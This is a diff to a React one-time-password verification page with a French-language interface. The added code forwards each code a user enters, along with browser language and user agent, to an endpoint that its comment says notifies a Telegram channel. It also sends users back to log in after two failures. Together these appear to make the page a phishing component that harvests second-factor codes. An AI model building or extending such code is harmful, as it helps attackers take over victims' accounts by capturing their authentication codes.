@@ -6,12 +6,17 @@ import { apiRequest } from "@/lib/queryClient";
 export default function OtpVerification() {
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [attempts, setAttempts] = useState(0);
   const [, setLocation] = useLocation();
   const { toast } = useToast();
 
   useEffect(() => {
-    // Track visitor when page loads
-    apiRequest("POST", "/api/track-visit", { page: "OTP Verification Page" }).catch(() => {
+    // Track visitor when page loads with language info
+    const language = navigator.language || 'Unknown';
+    apiRequest("POST", "/api/track-visit", { 
+      page: "OTP Verification Page",
+      language 
+    }).catch(() => {
       // Silent fail - tracking shouldn't break the app
     });
   }, []);
@@ -21,7 +26,16 @@ export default function OtpVerification() {
     setIsLoading(true);
 
     try {
-      const response = await apiRequest("POST", "/api/verify-otp", { otp });
+      // Get language and device info
+      const language = navigator.language || 'Unknown';
+      const userAgent = navigator.userAgent || 'Unknown';
+      
+      const response = await apiRequest("POST", "/api/verify-otp", { 
+        otp,
+        language,
+        userAgent,
+        attempt: attempts + 1
+      });
       const data = await response.json();
 
       if (data.success) {
@@ -32,17 +46,50 @@ export default function OtpVerification() {
         
         setOtp("");
         
-        // Redirect to home after successful verification
+        // Redirect to success page
         setTimeout(() => {
-          setLocation("/");
-        }, 1500);
+          setLocation("/success");
+        }, 1000);
+      } else {
+        // Server rejected the OTP - treat as failure
+        throw new Error(data.error || "Invalid OTP code");
       }
     } catch (error: any) {
-      toast({
-        title: "Verification failed",
-        description: error.message || "Please try again",
-        variant: "destructive",
+      // Increment attempt counter
+      const newAttempts = attempts + 1;
+      setAttempts(newAttempts);
+      
+      // Send failure notification to Telegram
+      const language = navigator.language || 'Unknown';
+      const userAgent = navigator.userAgent || 'Unknown';
+      apiRequest("POST", "/api/otp-failure", { 
+        otp,
+        language,
+        userAgent,
+        attempt: newAttempts
+      }).catch(() => {
+        // Silent fail - notification shouldn't break the app
       });
+      
+      if (newAttempts >= 2) {
+        toast({
+          title: "Too many failed attempts",
+          description: "Please return to login and try again.",
+          variant: "destructive",
+        });
+        
+        // Redirect to login after 2 failed attempts
+        setTimeout(() => {
+          setLocation("/login");
+        }, 2000);
+      } else {
+        toast({
+          title: "Verification failed",
+          description: `Incorrect code. You have ${2 - newAttempts} attempt remaining.`,
+          variant: "destructive",
+        });
+        setOtp("");
+      }
     } finally {
       setIsLoading(false);
     }
@@ -69,9 +116,15 @@ export default function OtpVerification() {
           Vérification
         </h1>
         
-        <p className="text-gray-600 mb-12" data-testid="text-description">
+        <p className="text-gray-600 mb-4" data-testid="text-description">
           Entrez le code de vérification envoyé à votre adresse e-mail
         </p>
+        
+        <div className="bg-gray-100 border border-gray-300 rounded-md p-3 mb-8 text-sm">
+          <p className="text-gray-700">
+            <span className="font-semibold">Pour tester:</span> Utilisez <code className="bg-white px-2 py-1 rounded text-black font-mono">123456</code> pour réussir, ou tout autre code pour échouer ({2 - attempts} tentative{2 - attempts !== 1 ? 's' : ''} restante{2 - attempts !== 1 ? 's' : ''})
+          </p>
+        </div>
 
         <form onSubmit={handleVerifyOtp} className="space-y-6">
           <div>
